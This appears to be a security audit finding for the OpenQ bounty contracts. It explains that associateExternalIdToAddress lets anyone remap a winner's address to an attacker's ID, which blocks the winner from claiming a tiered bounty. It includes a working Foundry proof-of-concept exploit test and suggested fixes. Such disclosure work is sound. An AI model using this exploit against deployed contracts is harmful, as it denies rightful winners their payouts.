0xdeadbeef

high

# `associateExternalIdToAddress` can be abused to prevent users from claiming their bounties

## Summary

`associateExternalIdToAddress` allows users to specify a mapping between on-chain address to their ID (github).
Due to the above behavior, an attacker can specify that the bounty WINNER's on-chain address will point to the attacker ID.

The overwritten mapping will prevent the bounty winner from claiming the bounty through `permissionedClaimTieredBounty`.

## Vulnerability Detail

When users register to the OpenQ platform to participate in a tiered bounty they associate their github ID with an on-chain address and pass it to the oracle. The oracle calls the on-chain `associateExternalIdToAddress` to persist the mapping specified by the user.
https://github.com/sherlock-audit/2023-02-openq/blob/main/contracts/OpenQ/Implementations/OpenQV1.sol#L464-L478

As can be seen above, there is no validation that the associated address really is tied to the user ID. 
Therefore, an attacker can supply the address of the winner and overwrite `addressToExternalUserId` map to point to his ID instead.
(Note: It was also confirmed by the sponsor that no such checks exists on the autotask)
```solidity
addressToExternalUserId[_associatedAddress] = _externalUserId;
```

Example association flow of `addressToExternalUserId`:
1. Winner associates `winner_Address -> winner_id`
2. Attacker associates `winner_address -> attacker_id`

The reason the winner will not be able to claim the bounty is because `addressToExternalUserId` is used to check against the winner id in `permissionedClaimTieredBounty`
https://github.com/sherlock-audit/2023-02-openq/blob/main/contracts/ClaimManager/Implementations/ClaimManagerV1.sol#L75-L100

Specifically in this `require` statement:
```solidity
        string memory closer = IOpenQ(openQ).addressToExternalUserId(
            msg.sender
        );
------
        require(
            keccak256(abi.encode(closer)) ==
                keccak256(abi.encode(bounty.tierWinners(_tier))),
            Errors.CLAIMANT_NOT_TIER_WINNER
        );
```

## Impact

Winners will not be able to claim their winning bounty through `permissionedClaimTieredBounty`.

## Code Snippet

I created a foundry POC that demonstrate end to end scenario and explains the entire flow.
To get it running, first install foundry using the following command:
1. `curl -L https://foundry.paradigm.xyz | bash` (from https://book.getfoundry.sh/getting-started/installation#install-the-latest-release-by-using-foundryup)
4. If local node is not already running and contracts are not deployed, configured and funded - execute the following:
```bash
yarn deploy-contracts:localhost
yarn configure-whitelist:localhost
yarn deploy-bounties:localhost
```
3 Perform the following set of commands from the repository root.
```bash
rm -rf foundry; foundryup; mkdir foundry; cd foundry; forge init --no-commit; cp -r ../contracts ./src/; forge install openzeppelin/openzeppelin-contracts --no-commit; forge install openzeppelin/openzeppelin-contracts-upgradeable --no-commit; echo "@openzeppelin/contracts=lib/openzeppelin-contracts/contracts/\n@openzeppelin/contracts-upgradeable=lib/openzeppelin-contracts-upgradeable/contracts/" > remappings.txt
```
5. Add the following to `foundry/test/PreventPermissionedClaim.t.sol
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {OpenQV1} from "../src/contracts/OpenQ/Implementations/OpenQV1.sol";
import {ClaimManagerV1} from "../src/contracts/ClaimManager/Implementations/ClaimManagerV1.sol";
import {DepositManagerV1} from "../src/contracts/DepositManager/Implementations/DepositManagerV1.sol";
import {BountyCore} from "../src/contracts/Bounty/Implementations/BountyCore.sol";
import {IERC20Upgradeable} from '@openzeppelin/contracts-upgradeable/token/ERC20/IERC20Upgradeable.sol';

contract PreventPermissionedClaim is Test {
    // Addresses of contracts
    OpenQV1 OPENQ = OpenQV1(0x5FC8d32690cc91D4c39d9d3abcBD16989F875707);
    ClaimManagerV1 CLAIM_MANAGER = ClaimManagerV1(0x2279B7A0a67DB372996a5FaB50D91eAA73d2eBe6);
    DepositManagerV1 DEPOSIT_MANAGER = DepositManagerV1(0xB7f8BC63BbcaD18155201308C8f3540b07f84F5e);
    IERC20Upgradeable LINK_TOKEN = IERC20Upgradeable(0x5FbDB2315678afecb367f032d93F642f64180aa3);
    
    // Fixed Tiered Bounty 
    string tieredFixedBountyId = "I_kwDOGWnnz85Oi-oQ";
    BountyCore bountyAddress;

    // Oracle
    address oracle;

    // 100 Link tokens will be funded, 80 for tier 0 and 20 for tier 1
    uint256 deposit_amount = 100; 

    function setUp() public {
        // Bounty address of the tieredFixedBountyId
        bountyAddress = BountyCore(OPENQ.bountyIdToAddress(tieredFixedBountyId));
        
        // Oracle address
        oracle = CLAIM_MANAGER.oracle();

        // Disable requirements for simplicity
        vm.startPrank(oracle);
        OPENQ.setKycRequired(tieredFixedBountyId, false);
        OPENQ.setInvoiceRequired(tieredFixedBountyId, false);
        OPENQ.setSupportingDocumentsRequired(tieredFixedBountyId, false);
        vm.stopPrank();

        // Fund the bounty with LINK
        deal(address(LINK_TOKEN), address(this), deposit_amount);
        LINK_TOKEN.approve(address(bountyAddress), deposit_amount);
    }

    // Helped to deposit funds to bounty
    function fundBountyToken(uint256 amount, uint256 expire, address token) public {
        DEPOSIT_MANAGER.fundBountyToken(
        address(bountyAddress),
        token, 
        amount,
        expire,
        string(abi.encodePacked(msg.sender)) // Unique for every funder
        );
    }

    function test_PreventPermissionedClaim() public {
        // Winner is going to claim tier 0 earning him 80 tokens
        uint256 tier = 0;

        // Fund 100 LINK tokens 
        fundBountyToken(deposit_amount, 1000, address(LINK_TOKEN));

        // Generate a legit winner address and ID
        address legit_winner = vm.addr(0x1337);
        string memory legit_winner_id = "legit_winner_id";

        // During registration, the legit_winner_id and on-chain address are associated
        vm.prank(oracle);
        OPENQ.associateExternalIdToAddress(legit_winner_id, legit_winner);

        // Set the legit_winner_id as the winner for tier 0!
        vm.prank(bountyAddress.issuer());
        OPENQ.setTierWinner(tieredFixedBountyId, tier, legit_winner_id);

        // Create hacker address and id
        address hacker = vm.addr(0x666);
        string memory hacker_id = "hacker_id";

        // During registration, hacker registers his ID with the LEGIT WINNER on-chain address 
        // This will overrride addressToExternalUserId mapping to point the winner address to the hacker id
        vm.prank(oracle);
        OPENQ.associateExternalIdToAddress(hacker_id, legit_winner);

        // Attempt to claim the bounty with permissionedClaimTieredBounty
        // This will revert with "CLAIMANT_NOT_TIER_WINNER" exception due to new addressToExternalUserId mapping
        bytes memory closerData = abi.encode(address(0x0), "dummy", address(0x0), "dummy", tier);
        vm.prank(legit_winner);
        vm.expectRevert("CLAIMANT_NOT_TIER_WINNER");
        CLAIM_MANAGER.permissionedClaimTieredBounty(address(bountyAddress), closerData);

        // Validate that no LINK tokens were claimed
        assertEq(LINK_TOKEN.balanceOf(address(bountyAddress)), deposit_amount);
    }
}
```
6. Execute `forge test -m test_PreventPermissionedClaim --fork-url=http://127.0.0.1:8545 `


## Tool used

VS Code, Foundry
Manual Review

## Recommendation

There are a few possible solutions to prevent the vulnerability:

### Validating a signed message

Pass along to `associateExternalIdToAddress` a signed message and signature that the on-chain wallet signed. The message should be produced with the user ID, the associated address and a nonce.
`associateExternalIdToAddress` will validate that `_associatedAddress` is the singer of the message using `ecrecover`

This will be problematic if users are multisig contracts or vaults

###  Only allow to change to non-associated addresses

in `associateExternalIdToAddress` add a require statement to check if `_associatedAddress` was already associated. 
Adding a `isAssociated[_associatedAddress] = true;` after association will help to add the require statement `require(isAssociated[_associatedAddress] == false, "Address already associated");`

This will prevent an attacker from changing an existing mapping while allowing a user to change their address to a new one.